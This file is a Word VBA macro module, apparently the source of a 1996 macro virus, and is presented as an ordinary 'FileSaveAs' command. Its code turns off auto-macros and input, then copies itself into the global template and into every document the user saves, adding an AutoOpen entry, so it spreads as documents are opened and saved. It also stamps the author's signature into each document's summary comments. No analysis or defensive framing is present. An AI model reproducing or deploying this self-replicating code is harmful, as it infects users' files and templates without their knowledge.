   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSaveAs"

   Dim FileBaru$, FileMacro$
   Dim salah

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   FileBaru$ = ""
   FileMacro$ = ""
   salah = 0
   WordBasic.DisableInput (1)
   WordBasic.DisableAutoMacros (1)
   On Error GoTo -1: On Error GoTo CekError
   FileMacro$ = WordBasic.[MacroFileName$]()
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   FileBaru$ = WordBasic.[FileName$]()
   CopyToFile
   If salah <> 0 Then CopyToGlobal
   Aksi
   WordBasic.FileSaveAs dlg
   GoTo Selesai

   CekError:
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs dlg
   End If
   Selesai:
   End Sub

   Private Sub CopyToFile()
   On Error GoTo -1: On Error GoTo finish
   CekCopyToFile
   If salah = 0 Then
       CopyAOF
   End If
   finish:
   End Sub

   Private Sub CekCopyToFile()
   On Error GoTo -1: On Error GoTo fin
   WordBasic.MacroCopy "Global:FileSaveAs", FileBaru$ + ":FileSaveAs", 1
   fin:
   salah = Err.Number
   End Sub

   Private Sub CopyToGlobal()
   On Error GoTo -1: On Error GoTo fin
   CopyAOtoG
   WordBasic.MacroCopy FileMacro$ + ":FileSaveAs", "Global:FileSaveAs", 1
   fin:
   salah = Err.Number
   End Sub

   Private Sub CopyAOtoG()
   On Error GoTo -1: On Error GoTo finish
   WordBasic.MacroCopy FileMacro$ + ":AutoOpen", "Global:FileSave", 1
   finish:
   End Sub

   Private Sub CopyAOF()
   On Error GoTo -1: On Error GoTo finish
       WordBasic.MacroCopy "Global:FileSave", FileBaru$ + ":AutoOpen", 1
   finish:
   End Sub

   Private Sub Aksi()
   On Error GoTo -1: On Error GoTo finish
   WordBasic.FileSummaryInfo Comments:="DZT'96" + Chr(13) + "(c)9 April 1996 by Hikmat S/D0E94328" + Chr(13) + "comp. dept. of HFT" + Chr(13) + "Instrumentasi Elektronika" + Chr(13) + "MIPA Terapan Fakultas MIPA" + Chr(13) + "Universitas Padjadjaran" + Chr(13) + "Bandung"
   finish:
   End Sub
